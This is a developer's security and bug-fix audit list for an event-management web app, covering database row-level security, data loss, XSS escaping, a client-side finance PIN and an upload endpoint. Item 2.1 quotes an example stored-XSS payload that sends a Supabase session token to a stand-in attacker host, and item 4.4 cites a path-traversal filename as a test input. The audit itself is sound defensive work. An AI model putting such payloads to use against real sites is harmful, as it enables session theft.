# Fix List — Happenings.co Event Management

Audit of `index.html` (was 10,648 lines at audit time; now 10,820 — JS layer starts at line 5605).
All line numbers refer to the `index.html` **as it was audited** — they have shifted with every fix, so
re-grep the anchor snippet quoted in each item rather than trusting the number.

Ordered by "fix this first". Tick items off as you go.

## Status — 2026-08-23

| Phase | Done | Remaining |
|---|---|---|
| 0 — RLS | client half only | **`rls-policies.sql` not run yet; anon key not rotated** |
| 1 — Data integrity | 1.1 – 1.6 (all) | — |
| 2 — Security | 2.1, 2.2, 2.3 | — |
| 3 — Correctness | 3.1 – 3.11 (all) | — |
| 4 — Structural | 4.1 – 4.6 (all) | — |
| 5 — Cosmetic | all 12 | — |
| README | all 6 | — |

Everything landed so far is **static verification only** — `node --check` on the extracted inline
script. Nothing in phases 1–3 has been click-tested in a browser. The riskiest untested paths are
the new reference-number lookup (3.2) and the desktop→mobile resize reset (3.7).

**Next up: nothing in the code — every item in this file is closed.** What remains is entirely
operational and needs dashboard access this repo does not have:

1. Run `rls-policies.sql` in the Supabase SQL editor, then rotate the anon key (0.1).
2. Run `settings-table.sql` (4.5) — now also carries the finance PIN, so re-run it if you
   already ran the earlier version; it is safe to re-run.
3. Set the five `R2_*` env vars in Vercel and add the bucket CORS rule (4.4).

Until step 1 is done the database is still world-readable and world-writable, which outranks
everything else in this file.

---

## Phase 0 — Do this before anything else

### [x] 0.1 Verify Row Level Security on Supabase

> **AUDIT RESULT — 2026-08-23: outcome 1. RLS was off or fully open to `anon`.**
>
> Probed live with the public anon key from `index.html:5638`:
>
> | table | anon SELECT | rows exposed | anon UPDATE grant | anon DELETE grant |
> |---|---|---|---|---|
> | `bookings`  | HTTP 206, returned rows | 29 | yes (204) | yes (204) |
> | `inventory` | HTTP 206, returned rows | 76 | yes (204) | yes (204) |
> | `staff`     | HTTP 206, returned rows | 17 | yes (204) | yes (204) |
> | `media`     | HTTP 206, returned rows | 12 | yes (204) | yes (204) |
> | `tasks`     | HTTP 200, returned rows | 1  | yes (204) | yes (204) |
>
> UPDATE/DELETE were probed with zero-row filters, which still enforce table
> privileges but cannot modify data. No write was made to the database.
>
> **Status of the two halves of the fix:**
> - [x] Client — `db()` now sends `session.access_token` (see `index.html`, `db()`).
> - [ ] **Server — NOT DONE. Run `rls-policies.sql` in the Supabase SQL editor.**
>       Until this is run the data is still world-readable and world-writable.
> - [ ] Rotate the anon key afterwards; the current one has been public in git.

**Where:** Supabase dashboard → Authentication → Policies (not in this file)
**Why:** `db()` at `index.html:5827` sends the **anon key** as the bearer token for every read and write:

```js
"Authorization": "Bearer " + SK   // SK is the public anon key, line 5638
```

It never sends the logged-in user's `session.access_token`. The anon key and project URL are committed
in a public GitHub repo. That means Supabase Auth is currently decorative for *data* access — the login
screen gates the UI, not the database.

**Check:** for each of `bookings`, `inventory`, `staff`, `media`, `tasks`, confirm RLS is **enabled** and
that policies do not grant `anon` select/insert/update/delete.

**Two possible outcomes:**
- RLS is off or open → anyone with the repo URL can read/write all client data. Fix immediately.
- RLS denies `anon` → the app cannot currently work at all; you must switch `db()` to the user token.

**The proper fix either way** — make `db()` use the session token:

```js
async function db(path, method, body) {
  var { data: { session } } = await _sb.auth.getSession();
  var token = session ? session.access_token : SK;
  var headers = {
    "apikey": SK,
    "Authorization": "Bearer " + token,
    "Content-Type": "application/json"
  };
  // ...rest unchanged
}
```

Then write RLS policies against `auth.uid()` / `authenticated` role. Note `db()` becomes `async`;
all existing `.then()` call sites keep working unchanged.

---

## Phase 1 — Data integrity (silent data loss happening now)

### [x] 1.1 Fire-and-forget database writes that report success
**Where:** `5827` (`db`), and these call sites — `6488`, `7913`, `7953`, `8856`, `8869`, `9019`, `9141`, `10045`

Each of these calls `db(...)` with **no `.then()` and no `.catch()`**, mutates the in-memory array, then
shows a success toast and navigates away. Example, `confirmReserve` at `8851`:

```js
db("bookings?id=eq." + curBkg.id, "PATCH", { dispatch_items: di, staff_assigned: curStaffAssign || [] });
toast("Inventory reserved!"); go("s-bkns");   // <- runs whether or not the write succeeded
```

If the request fails (offline, RLS denial, expired token, network blip) the user is told it worked and
the data is gone on the next reload.

**Fix:** add a shared helper and route all seven through it.

```js
function dbSave(path, method, body, okMsg, onOk) {
  ld();
  return db(path, method, body)
    .then(function (r) { hd(); if (okMsg) toast(okMsg); if (onOk) onOk(r); return r; })
    .catch(function (err) { hd(); alert("Save failed: " + err.message + "\nYour change was NOT saved."); throw err; });
}
```

Then, e.g. `confirmReserve`:

```js
dbSave("bookings?id=eq." + curBkg.id, "PATCH", {...}, "Inventory reserved!", function () {
  curBkg.dispatchItems = di;   // only mutate local state AFTER the server confirms
  go("s-bkns");
});
```

Note the ordering change: mutate local state and navigate **inside** the success callback, not before.

- [x] `6488` — event details save (desktop)
- [x] `7913` — add discussion note
- [x] `7953` — delete discussion note
- [x] `8856` — `confirmReserve`
- [x] `8869` — event details save (mobile)
- [x] `9019` — `genSheet`
- [x] `9141` — category reassign to "Others"
- [x] `10045` — save invoice items

### [x] 1.2 Booking detail writes to the WRONG booking (mobile only)
**Where:** `rDetail`, `7902`–`7933`

`bdetail-body` is a static element (`4864`), so the `if (!el.dataset.delegated)` guard attaches the click
handler exactly **once** — and that handler closes over `b` from the *first* booking ever opened.

Open booking A, go back, open booking B, add a note → the note is saved to **booking A**. Same for the
external-elements toggle and "Send Booking Summary". Desktop is accidentally safe because `renderDesk`
rebuilds the container each visit (`6418`).

**Fix:** don't close over `b`. Re-look it up from `curDetailId` inside the handler:

```js
el.addEventListener("click", function (e) {
  var b = BKN.find(function (x) { return x.id === curDetailId; });
  if (!b) return;
  // ...existing body, now using this fresh `b`
});
```

Also remove the `data-bid`/`b.id === bid` comparison at `7923` — it becomes redundant once `b` is correct.

### [x] 1.3 Saving finance costs erases external-element status
**Where:** `saveCosts`, `9751`

```js
b.costs = bids[bid];   // replaces the ENTIRE costs object
```

`bids[bid]` only contains `COST_COLS` keys. But `costs.extDone` — the external-element completion flags
written at `7925` — lives in that same object. Clicking "Save Costs" wipes `extDone` for every booking in
that month, silently resetting the red/green dots on the calendar and booking cards.

**Fix:**

```js
b.costs = Object.assign({}, b.costs, bids[bid]);
db("bookings?id=eq." + bid, "PATCH", { costs: b.costs })
```

Careful: a value cleared to blank must still be removable. Explicitly delete keys that are now empty
rather than relying on omission:

```js
COST_COLS.forEach(function (k) { if (!(k in bids[bid])) delete b.costs[k]; });
```

While here, also fix the broken completion counter at `9752` — the `.catch` doesn't increment `done`, so
one failed request means the "Costs saved!" toast never fires and `ld()` never clears.

### [x] 1.4 Editing a booking duplicates every external element
**Where:** `openEditBkn:7170` + `doFinalSave:7770`

`openEditBkn` marks chips across the **whole document**:

```js
document.querySelectorAll(".echk").forEach(function (e) {
  if (exts.includes(e.getAttribute("data-v"))) e.classList.add("on");
});
```

On desktop both `#ext-checks` (mobile, hidden) and `#ext-checks-d` exist, so both get marked. Then
`doFinalSave` harvests globally:

```js
document.querySelectorAll(".echk.on").forEach(function (e) { ext.push(e.getAttribute("data-v")); });
```

Result: edit + save a booking on desktop and `["Panelling","Trussing"]` becomes
`["Panelling","Panelling","Trussing","Trussing"]`. Combined with 1.5, the `extDone` indices then point at
the wrong items.

**Fix:** scope both queries to the container that is actually visible, and de-duplicate as a belt-and-braces:

```js
var scope = document.getElementById(isDesk ? "ext-checks-d" : "ext-checks");
var ext = [];
if (scope) scope.querySelectorAll(".echk.on").forEach(function (e) {
  var v = e.getAttribute("data-v");
  if (v && ext.indexOf(v) === -1) ext.push(v);
});
```

Apply the same scoping in `openEditBkn`.

### [x] 1.5 `extDone` stores array indices into a mutable list
**Where:** `7882`, `7925`–`7927`

External-element completion is stored as indices (`extDone: [0, 2]`) into `b.extItems`. Delete or reorder
an element and every flag after it shifts to the wrong item.

**Fix:** store the element **name** instead of the index. Migration for existing rows: on load in
`prepareBooking` (`6559`), convert numeric entries to names using the current `pending_items` order.

### [x] 1.6 Editing a booking lands on a blank detail screen
**Where:** `doFinalSave`, `7801`–`7802`

```js
clearNewBkn();            // sets curEditBknId = null  (line 7119)
go("s-bkn-detail");
rDetail(curEditBknId);    // rDetail(null) -> BKN.find misses -> early return
```

**Fix:** capture the id first.

```js
var savedId = curEditBknId;
clearNewBkn();
curDetailId = savedId;
go("s-bkn-detail");
```

(`go("s-bkn-detail")` already calls `rDetail(curDetailId)` at `6164`, so the explicit call is redundant.)

---

## Phase 2 — Security

### [x] 2.1 Stored XSS in every render path

> **DONE — 2026-08-23.** `esc()` added next to the other utils (search `── UTILS ──`), and every
> interpolated user value in an `innerHTML` string is now wrapped — ~248 call sites. Covered:
> dashboard, calendar, bookings list, booking detail, discussion log, external-element chips,
> all five inventory grids, cart, dispatch hub, dispatch sheet + print sheet, inventory manager,
> staff/packages/category modals, finance cards + cost grid + finance print, invoice builder /
> preview / print / PDF, quote builder / preview / both PDF paths, media grid + lightbox,
> category tabs, and the business name (`BN`).
>
> Deliberately **not** escaped, because they are not HTML:
> - `toast(...)` / `alert(...)` — these set `textContent`, escaping would show literal `&#39;`.
> - WhatsApp `msg` strings — that is item **3.10** (URL encoding), a different fix. Escaping them
>   would put `&amp;` into the message body.
>
> Note `esc()` escapes both quote styles, so it is safe inside `value='…'` and `value="…"` alike,
> and `getAttribute()` decodes entities on the way back out — so the `data-v` / `data-sn` chip
> comparisons still match. The old hand-rolled `String(e).replace(/'/g, "&#39;")` on the detail
> external-element chip was replaced by `esc()`, which also fixes `&` in an element name.

**Where:** essentially all `innerHTML` construction. Worst offenders:
`7006`, `7858`, `9034` (`b.name`), `6823` (`t.title`), `7946` (`entry.text`), `7034` (external elements),
`8180`/`10054` (`l.desc`), `10394` (`m.title`), `8603`/`9377` (`item.name`)

A client name of `<img src=x onerror="fetch('https://evil/'+localStorage.getItem('sb-...'))">` executes on
every screen that lists bookings, for every user, on every device.

**Fix:** add one helper near the other utils (`~5851`) and wrap every interpolated user value:

```js
function esc(s) {
  return String(s == null ? "" : s)
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}
```

Then `"<div class='bc-name'>" + esc(b.name) + "</div>"`. Grep for `+ b.` / `+ item.` / `+ l.` / `+ m.` /
`+ entry.` / `+ t.` inside string concatenation and wrap each one. This is tedious but mechanical.

### [x] 2.2 Apostrophes break inputs and documents

> **DONE — 2026-08-23**, in the same pass as 2.1. All seven quote-form `value='…'` attributes,
> the finance Note and cost inputs, the staff-assign chips and the print/PDF titles now go
> through `esc()`. **O'Brien** survives a round trip through the quote form, the cost grid and
> both PDF paths.

**Where:** `7991`–`7998` (quote form), `9670` (finance Note), `9490` (staff assign), `8279` (print title)

```js
"<input id='qt-client' value='" + (quoteInfo.clientName || '') + "'>"
```

A client named **O'Brien** truncates the attribute and injects markup. `esc()` from 2.1 fixes all of these
at the same time — do them together.

### [x] 2.3 Finance PIN is cosmetic
**Where:** `5606` (`FP`, default `"12345678"`), `9570`

The PIN is a localStorage string compared in the browser. Anyone can read it in DevTools or set
`financeUnlocked = true` from the console. If finance data genuinely needs to be restricted, it has to be
a separate Supabase role/table with its own RLS policy. Otherwise, treat it as a speed bump and don't rely
on it — decide which, and note the decision.

> **DECIDED — 2026-08-24: speed bump, and say so.** The PIN stays client-side; the three concrete
> flaws behind it were fixed.

**Why not make it real.** The gated data is `bookings.costs`, a column on `bookings` — and every
signed-in user already fetches `bookings` in full at `loadAll` to render the list. Finance figures
are therefore in the network response before any PIN is typed, so no client-side gate could ever
have restricted them. Making it real is a data migration (move `costs` to its own table, add a
per-user finance flag, rewrite the booking read/write paths), not a PIN change — a large amount of
new untested code on a codebase that still has not been click-tested. Deferred deliberately; the
README and `settings-table.sql` both record what it would take.

**What was fixed:**

- **No more hardcoded default.** `FP` was `localStorage.getItem("ev_fin_p") || "12345678"` — a
  default published both in this file and in the README, so on any fresh device the gate opened to
  a string the whole internet knew. `FP` now starts empty and `goFin()` handles "no PIN set" by
  toasting *"Set a Finance PIN in Settings first"* and opening finance, rather than comparing
  against a guessable constant. `fin-confirm` also guards on `FP` being non-empty, so an empty
  stored PIN can never be satisfied by an empty input box.
- **The PIN is no longer rendered back into the page.** Both settings-modal openers
  (`name-btn` and `desk-name-edit-btn`) did `document.getElementById("fin-pin-inp").value = FP`.
  `type="password"` hides it visually but the value sits in the DOM, so anyone who could open
  Settings could read the PIN without touching DevTools — a much lower bar than the console trick
  this item was originally about. The field now opens blank, with the placeholder *"Leave blank to
  keep current"*, and a hint line that changes depending on whether a PIN is set yet.
- **It is shared, not per-device.** `ev_fin_p` moved into the phase-4.5 `settings` table, so it no
  longer differs per browser. This needed a small extension to the settings sync, which assumed
  every value was an array (`if (!Array.isArray(v)) return;` silently dropped anything else): a
  `SETTINGS_STRINGS` list now routes string-valued keys down their own branch.
- **Upgrade path handled.** The old code wrote the PIN raw (`"1234"`); `saveSetting` JSON-encodes
  (`'"1234"'`). A new `readFinPin()` accepts either, so an existing device keeps its current PIN
  instead of silently falling back to "no PIN set".
- **`settings-table.sql` updated.** The VERIFY query ended in `jsonb_array_length(value)`, which
  throws on a jsonb *string* — the first `ev_fin_p` row would have made the script error on its
  last statement. It is now guarded by `jsonb_typeof`. The header documents the new key and states
  in the file itself that the PIN is clear text and readable by any signed-in user.

- **Session re-locks on change.** `goFin()`'s no-PIN path sets `financeUnlocked = true`, so without
  this the person who had just been told to set a PIN would still have finance open for the rest of
  the session. `name-confirm` now clears the flag whenever a PIN is set or changed.

Verified with `node --check` on the extracted inline script. Not click-tested — the paths worth
exercising in a browser are: fresh device with no PIN, a device carrying the old raw-format PIN,
and setting a PIN on one device then reloading on another.

---

## Phase 3 — Correctness bugs users will hit

> **DONE — 2026-08-23.** All eleven items applied and the script syntax-checked
> (`node --check` on the extracted inline script). Notes on the judgement calls:
>
> - **3.1** helper is named `todayLocal()`, not `todayStr()` — `rCal` already has a local
>   variable called `todayStr`. Four sites replaced, plus the task modal's default date,
>   which set the date from UTC while setting the time from local hours.
> - **3.2** took the "minimum" fix: refs are now `HAP<YYYYMMDD>-NNN`, with the suffix
>   derived from a `ref=like.HAP<date>*` query against the **database** (falling back to the
>   local list when that query fails). The insert moved into `saveNewBooking(refNum)` so it
>   can run after the lookup. The unused `bknCounter` / `ev_bkn_counter` was deleted.
>   A narrow race remains between lookup and insert — a unique index on `bookings.ref`
>   is still worth adding server-side.
> - **3.3** `cur_quote` and `cur_invoice_lines` are written from `renderQuoteLines()` /
>   `renderInvoiceLines2()` (every mutation path ends in one of those) and restored in
>   `loadAll` next to `inv_bkg_id`. `rInvoicePreview` also falls back to `b.invoiceItems`.
> - **3.4** rounds with `Math.round(Math.abs(...))` at the entry point; the existing "Zero" /
>   "Rupees Only" wording was left as it was.
> - **3.5** one-word change: `data-max` on the reserve grid is `av`, not `av + inC`.
> - **3.6** minimal fix — empty input now returns early. `preventNegative` was **kept**, not deleted:
>   its paste/keypress guards do more than the global keydown handler. Its listener stacking is
>   still open as **4.2**.
> - **3.7** `initLayout` clears `#desk-content` on the way down to mobile.
> - **3.8** the `[data-invoice]` / `[data-del]` branches are gone from the document handler.
>   Safe because desktop rebuilds `#bkns-list` (resetting `dataset.delegated`), so the per-list
>   handler rebinds in both layouts.
> - **3.9** the two `sendPdfToWhatsApp` pop-ups got the same null guard — same failure mode.
> - **3.10** fixed at the boundary instead of per-message: `goWA()` now calls
>   `encodeURIComponent` itself and all five builders use real `\n`. The percent-encoded
>   emoji (📄 📋 📞 ✅) became literal characters.
> - **3.11** applied to the two client-facing messages (invoice, booking summary).
>   The dispatch confirmation ("Assalam o Alaikum **Team**") and the media-gallery share
>   stay recipient-less on purpose. The quote still passes `quoteInfo.phone`, which nothing
>   ever sets — that is the Phase 5 item.

### [x] 3.1 "Today" is computed in UTC
**Where:** `6793` (`rDash`), `6887` (`rCal`), `6980` (`rBkns`), `8460` (`rDispatchHub`)

```js
var today = new Date().toISOString().split("T")[0];   // UTC date
```

Pakistan is UTC+5, so between **midnight and 5:00 AM local** this returns *yesterday*. Today's events
disappear from the dashboard, the calendar's "today" highlight is wrong, and "Upcoming" hides the current
day's bookings.

**Fix:** add a helper and replace all four:

```js
function todayStr() {
  var d = new Date();
  return d.getFullYear() + "-" + String(d.getMonth() + 1).padStart(2, "0") + "-" + String(d.getDate()).padStart(2, "0");
}
```

### [x] 3.2 Reference numbers collide across devices
**Where:** `doFinalSave`, `7805`–`7817`

`refNum = "HAP" + YYYYMMDD`, deduplicated only against the local in-memory `BKN`. Two people creating
bookings on the same day from different devices both get `HAP20260823`. The `bknCounter` that is
incremented and persisted at `7805` is never actually used in the ref. Suffixes also run past `Z` into
`[`, `\`, `]` after 26 collisions (`String.fromCharCode(65 + n)`).

**Fix (best):** make `ref` a Postgres identity/sequence column and let the DB generate it, returning it
from the `POST`. **Fix (minimum):** query the max existing ref for today before inserting, and use a
zero-padded numeric suffix (`HAP20260823-001`) instead of letters.

### [x] 3.3 Quote and invoice state is lost on refresh
**Where:** `7975`–`7977` (`quoteLines`, `quoteInfo`), `5621` (`invoiceLines`), `rInvoicePreview:10103`

`go()` restores `invoiceBkgId` from localStorage (`6665`) but never restores `invoiceLines` — reload while
on the invoice preview and it renders with zero items and PKR 0 totals. The quote builder is worse:
`quoteLines`/`quoteInfo` are never persisted at all, so a refresh mid-quote loses everything.

**Fix:** persist both to localStorage on change (same pattern as `saveDraft` at `7078`) and restore them
in `loadAll` alongside the other `cur_*` keys. For the invoice specifically, `rInvoicePreview` could
instead re-read `b.invoiceItems` when `invoiceLines` is empty.

### [x] 3.4 `numToWords` prints "UNDEFINED RUPEES ONLY" on decimals
**Where:** `9873`, used at `10098`, `8244`, `8338`

`h(0.5)` → `num < 20` → `ones[0.5]` → `undefined`. Any invoice or quotation whose balance has a fractional
part prints garbage in the amount-in-words line.

**Fix:** round at the entry point.

```js
function numToWords(n) {
  n = Math.round(Math.abs(Number(n) || 0));
  if (n === 0) return "Zero Rupees Only";
  // ...rest unchanged
}
```

### [x] 3.5 Reservation screen allows over-booking
**Where:** `rReserveGrid:8781` vs `rGrid:8606`

```js
// rReserveGrid — WRONG
"<div class='iqtybar' data-max='" + (av + inC) + "' ..."
// rGrid — correct
"<div class='iqtybar' data-max='" + av + "' ..."
```

`av` comes from `availQ(item.id, curBkg.date, curBkg.id)` which **already excludes** the current booking,
and `inC` came from that same booking's cart. Adding them inflates the cap by the amount already reserved,
so the reserve screen lets you exceed physical stock. The qty modal (`8716`) clamps to `av` correctly —
so the two screens currently disagree.

**Fix:** change `8781` to `data-max='" + av + "'`.

### [x] 3.6 You can't clear a number field
**Where:** `preventNegative`, `7345`–`7350`

```js
var value = parseFloat(e.target.value);
if (value < 0 || isNaN(value)) { e.target.value = Math.max(0, value || 0); }
```

An empty string gives `NaN` → the field is force-filled with `0`. Backspacing "Total Cost" refills it with
0 instantly.

**Fix:** allow empty.

```js
if (e.target.value === "") return;
var value = parseFloat(e.target.value);
if (value < 0) e.target.value = 0;
```

Note the global handlers at `10599`–`10606` already do this correctly, so `preventNegative` may be
redundant entirely — consider deleting it and its four call sites (`7368`–`7373`).

### [x] 3.7 Resizing a desktop browser below 768px breaks the app
**Where:** `initLayout`, `6112`–`6122`; resize handler `6123`

Desktop renders clone real IDs (`nb-name`, `inv-grid`, `fin-body`, `bdetail-body`, `quote-screen-body`…)
into `#desk-content`, which sits at line `4404` — *before* the mobile screens at `4453`+. So
`getElementById` resolves to the desktop copy. That's why desktop works at all. But `initLayout` hides
`#desk-main` on shrink without clearing it, so mobile renders keep writing into hidden desktop nodes and
the screen stays blank.

**Fix:** clear the container when leaving desktop mode.

```js
function initLayout() {
  isDesk = window.innerWidth >= 768;
  var dc = document.getElementById("desk-content");
  if (!isDesk && dc) dc.innerHTML = "";   // <- drop the duplicate-ID copies
  // ...rest unchanged
}
```

### [x] 3.8 Double-handled clicks on booking cards
**Where:** document handler `6689`–`6715` vs `bkns-list` handler `7043`–`7061`

Both catch `[data-invoice]` and `[data-del]`. The list handler runs first (bubbling), then the document
handler runs too — its `stopPropagation()` is too late. Effects:
- Invoice opens **twice** per click.
- Delete shows `confirm()` (list handler) *and* flips the button to "Sure?" (document handler), so
  cancelling still arms a one-click delete on the next tap.

**Fix:** delete the `data-invoice` and `data-del` branches from the document-level handler at `6689`. The
per-list handlers already cover them.

### [x] 3.9 Popup blocker silently kills printing
**Where:** `8355` (`printQuote`), `9853` (`printFinance`), `10252` (invoice print)

```js
var win = window.open("", "_blank"); win.document.write(html);
```

A blocked popup makes `win` null → TypeError → swallowed by the outer try/catch (see 4.1). Nothing happens
and no error is shown.

**Fix:**

```js
var win = window.open("", "_blank");
if (!win) { toast("Please allow pop-ups to print."); return; }
```

### [x] 3.10 WhatsApp messages are never URL-encoded
**Where:** `6036`, `8153`, `8393`, `8443`

These hand-write `%0A` for newlines then concatenate raw user data (names, venues, notes). An `&` in a
venue name truncates the message; a `#` drops everything after it. The PDF paths at `5885` and `5981`
correctly use `encodeURIComponent` — the text paths don't.

**Fix:** build the message with real `\n` characters and call `encodeURIComponent(msg)` once at the end,
matching the PDF paths.

### [x] 3.11 "Send Booking Summary to Client" doesn't address the client
**Where:** `8443`, and also `6036`, `8153`, `8393`

```js
goWA("", msg);   // b.phone is available right there
```

`getWaUrl` (`5855`) already handles a phone number properly. Every share opens WhatsApp with no recipient
and the user has to pick manually.

**Fix:** `goWA(b.phone || "", msg)` for client-facing messages; keep `""` for team broadcasts if that's
intentional.

---

## Phase 4 — Structural / performance

### [x] 4.1 The whole app is wrapped in one silent try/catch

> **DONE — 2026-08-23.** Both halves:
> - A `bindEl(id, evt, fn)` helper was added next to `ld()`/`hd()`. It resolves the element,
>   `console.error`s `Init: missing element #<id>` when it is absent, and only then binds.
>   All 28 top-level `document.getElementById("x").addEventListener(...)` statements now go
>   through it; the two top-level `.onclick =` bindings (`add-icat-btn`, `add-mcat-btn`) got the
>   equivalent inline `if (!el) console.error(...); else el.onclick = ...` guard.
>   A missing element now costs one handler, not the rest of init.
> - The blanket `catch` now `console.error`s the full error object (not just `.message`) and
>   paints a red banner at the top of `<body>` via `insertAdjacentHTML`, escaped with `esc()`
>   and itself wrapped in a try/catch so the reporter can never throw.
>
> The blanket try/catch was **kept** as a net for the remaining non-binding top-level statements —
> it is just no longer silent. All 30 bound ids were verified to exist in the document.
> Verified with `node --check` on the extracted inline script; not click-tested in a browser.
**Where:** `5605` → `10646`

```js
try {
  // ...5,000 lines, the entire application...
} catch (e) { console.warn("Init Error:", e.message); }
```

There are ~30 unguarded `document.getElementById(...).addEventListener(...)` at top level (`6536`, `6747`,
`9151`, `9299`–`9310`, `9496`, `9550`, `9569`, `10554`). Rename or remove one element and everything after
it never binds — no login handler, no `loadAll()`, blank screen — with only a `console.warn`. This is why a
small edit can silently kill the app.

**Fix (incremental, low risk):** at minimum make the failure loud:

```js
} catch (e) {
  console.error("Init Error:", e);
  document.body.insertAdjacentHTML("afterbegin",
    "<div style='background:#C0503C;color:#fff;padding:12px;font:14px sans-serif;'>Startup error: "
    + e.message + " — please report this.</div>");
}
```

**Fix (proper):** remove the blanket try/catch and null-guard the ~30 bare `getElementById` bindings, the
same way the rest of the file already does (`if (el) el.addEventListener(...)`).

### [x] 4.2 Event-listener stacking on mobile

> **DONE — 2026-08-23.** Every binder that touches a **static** element is now idempotent via a
> `dataset.bound` flag on the element itself — which is exactly right for this app, because the
> desktop path rebuilds `#desk-content` and its clones are fresh nodes that still rebind.
>
> - `bindInvCattabs` — guarded, and the duplicate `touchend` handler **deleted** (it was an exact
>   copy of the `click` body, so every mobile tap ran `rINV()` twice on top of the per-visit stacking).
> - `validateField` (`dataset.vfBound`), `preventNegative` (`dataset.pnBound`) and the `checkAdvance`
>   input/change pair (`dataset.advBound`) — three separate flags, since `nb-total` / `nb-paid`
>   receive all three.
> - Same defect, same fix, found while in here: `bindInvSearch`, `bindDispatchSearch`,
>   `bindReserveSearch`, `bindNbReserveSearch` (per element), `bindDispatchCattabs`,
>   `bindReserveCattabs`, and `#cart-bar`.
> - The two top-level mobile handlers (`mobCattabs`, `mobResCattabs`, `mobCartBar`) were **verbatim
>   copies** of the bodies in `bindDispatchCattabs` / `bindReserveCattabs`. They were replaced by
>   calls to those functions — the guard makes the mobile and desktop paths bind the same element
>   exactly once between them.
> - `renderDesk` bound `#cart-bar` a second time immediately after calling `bindDispatchCattabs()`,
>   which already binds it — that line is gone, so a cart-bar tap no longer calls `go("s-cart")` twice.
>
> `preventNegative` was **kept** (see the 3.6 note — its paste/keypress guards do more than the
> global keydown handler); it just no longer stacks. `bindQuoteScreen` was checked and left alone:
> `rQuoteScreen()` rebuilds its inputs before every call, so nothing accumulates.
> Verified with `node --check`; not click-tested in a browser.
**Where:** `bindInvCattabs` called from `9242` (init), `6159` (`go`), `6451` (`renderDesk`)

Each call does `addEventListener` on the **same static** `#inv-cattabs`. After N visits to Inventory, one
tap runs `rINV()` N times. It also binds both `click` **and** `touchend` (`9232`–`9238`), so every mobile
tap already renders twice.

Same accumulation in `validateField` (`7314`–`7316`) and `preventNegative` (`7345`–`7362`), which
re-register on every `bindNewBkn()` — and `bindNewBkn` runs on every `clearNewBkn()` and every desktop
render of `s-new-bkn`.

**Fix:** guard with a dataset flag, matching the existing pattern used by `bindInspo` (`8900`):

```js
function bindInvCattabs() {
  var el = document.getElementById("inv-cattabs");
  if (!el || el.dataset.bound) return;
  el.dataset.bound = "1";
  // ...
}
```

Drop the `touchend` handler — `click` fires on mobile too.

### [x] 4.3 Pagination is dead code

> **DONE — 2026-08-23. Decision: enabled, not deleted** — `PAGE_SIZE = 60` (user's call).
> The pager machinery turned out to be complete and correctly wired: every category tab and
> every search handler already resets `currentPages[...]` to 0, so no other change was needed
> to bring it to life.
>
> Four grids page: `rGrid` (`inv-grid`), `rReserveGrid` (`reserve-inv-grid`), `rNbReserveGrid`
> and `rNbReserveGridD`. `rINV` groups by category instead and was left alone.
>
> One hardening added while enabling it — the page index is now clamped:
>
> ```js
> var totalPg = Math.ceil(filtered.length / PAGE_SIZE);
> var pIdx = Math.min(currentPages["inv-grid"] || 0, totalPg - 1);
> currentPages["inv-grid"] = pIdx;
> ```
>
> Without it, sitting on page 2 and then deleting items (or narrowing a filter) leaves a stale
> index past the end, `slice()` returns nothing, and the grid renders blank. That path could
> never fire while `PAGE_SIZE` was 999999; it can now.
>
> Verified: the pager buttons sit inside the grid's delegated click handler, which starts with
> `closest(".icard")` → `null` → return, so they pass through untouched. Slice coverage
> simulated for 0/1/59/60/61/76/120/121/500 items — every item reachable exactly once, no
> duplicates, and a stale index of 5 against 10 items clamps to 0. **At today's ~76 inventory
> items the "All" tab now shows a Next Page button; most category tabs stay single-page.**
> Not click-tested in a browser.
**Where:** `5608`

```js
var PAGE_SIZE = 999999;
```

Every grid computes pages, builds Prev/Next buttons, and tracks `currentPages` — all of which can never
trigger. Every inventory grid renders the full list every time. Either set a real page size (e.g. 60) and
let the existing pager work, or delete the pagination blocks from the five `r*Grid` functions.

### [x] 4.4 Missing upload endpoint

> **DONE — 2026-08-23. Confirmed missing, and written.**
>
> **The finding was worse than this item assumed.** There is no `api/` directory in the repo, *and*
> `vercel.json` would have shadowed the function even if there were one:
> - legacy `version: 2` + `builds` disables Vercel's zero-config `api/` detection, so an `api/`
>   folder would never have been built at all;
> - `routes` had a bare catch-all `"/(.*)" → "/index.html"` with no `{"handle": "filesystem"}`
>   ahead of it, so `/api/get-upload-url` resolved to the HTML page.
>
> So the real symptom was **not** "Failed to get upload URL". The catch-all returned **200 with
> HTML**, `resUrl.ok` was `true`, and the code sailed past that throw to die one line later on
> `resUrl.json()` — users saw `Upload failed: Unexpected token '<'`.
>
> **Five features were dead:** dispatch-sheet PDF→WhatsApp (`5933`), quotation PDF→WhatsApp
> (`6030`), new inventory item photo (`9483`), inventory photo update (`9571`), media gallery
> upload (`10649`).
>
> **What was added:**
> - `api/get-upload-url.js` — presigned R2 PUT, AWS SigV4 signed with Node's built-in `crypto`.
>   **No npm dependencies and no `package.json`**, deliberately: the repo stays buildless.
>   Presigning (rather than proxying the bytes) also dodges Vercel's 4.5 MB request-body cap,
>   which event photos and PDFs exceed.
>   Keys are `YYYY-MM-DD/<epoch>-<rand>-<sanitised-name>`; the filename is stripped of any path,
>   so `../../etc/passwd.png` lands as `passwd.png` under the date prefix.
>   Rejects non-POST (405), missing filename (400), and any type that is not `image/*`,
>   `video/*` or `application/pdf` (400).
> - `vercel.json` — added the `@vercel/node` build for `api/*.js` and put `{"handle": "filesystem"}`
>   ahead of the catch-all.
> - Both client call sites now read the server's JSON `error` field instead of throwing one
>   opaque message.
>
> **Verification:** the SigV4 chain was checked against AWS's published presign test vector
> (`examplebucket/test.txt`, 20130524T000000Z) — signature matches byte for byte. The handler
> was then exercised over all eight paths above (405 / missing-env / no-filename / bad-type /
> string body / pdf / path traversal / unicode filename) and the emitted `uploadUrl` path,
> `publicUrl` and 64-char signature were checked for consistency. Not run against real R2.
>
> **⚠️ Still needs you — set in Vercel → Settings → Environment Variables:**
> `R2_ACCOUNT_ID`, `R2_BUCKET`, `R2_ACCESS_KEY_ID`, `R2_SECRET_ACCESS_KEY`, `R2_PUBLIC_BASE`
> (public read base, e.g. `https://pub-xxxx.r2.dev`). Until they are set the endpoint returns a
> clear 500 naming the missing variables. **The R2 bucket also needs a CORS rule allowing `PUT`
> from the app's origin**, or the browser blocks the upload before it leaves the page.
**Where:** `6069`, `10459` — `fetch("/api/get-upload-url", ...)`

This serverless function is **not in this repo** and `vercel.json` only declares a static build. Confirm it
exists in the Vercel project; if not, every inventory photo, media upload, and PDF-to-WhatsApp share fails
with "Failed to get upload URL".

